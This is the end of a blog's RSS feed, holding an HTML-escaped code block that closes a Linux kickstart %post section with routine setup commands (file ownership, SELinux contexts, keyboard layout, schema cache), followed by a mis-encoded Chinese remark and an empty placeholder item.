&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# make sure to set the right permissions and selinux contexts&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;chown -R liveuser:liveuser /home/liveuser/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;restorecon -R /home/liveuser/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Fixing default locale to us&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;localectl set-keymap us&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;localectl set-x11-keymap us&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# rebuild schema cache with any overrides we installed&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;glib-compile-schemas /usr/share/glib-2.0/schemas&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;%end&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œä¸Šé¢æ³¨é‡Šäº†ä¸¤ä¸ªåœ°æ–¹ï¼Œéƒ½å¯ä»¥æ·»åŠ è½¯ä»¶æˆ–è€…è¿è¡Œè„šæœ¬&lt;/p&gt;</description>
    </item>
    <item>
      <title></title>
      <link>https://rendoumi.com/posts/untitled/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://rendoumi.com/posts/untitled/</guid>
      <description></description>
    </item>
  </channel>
</rss>
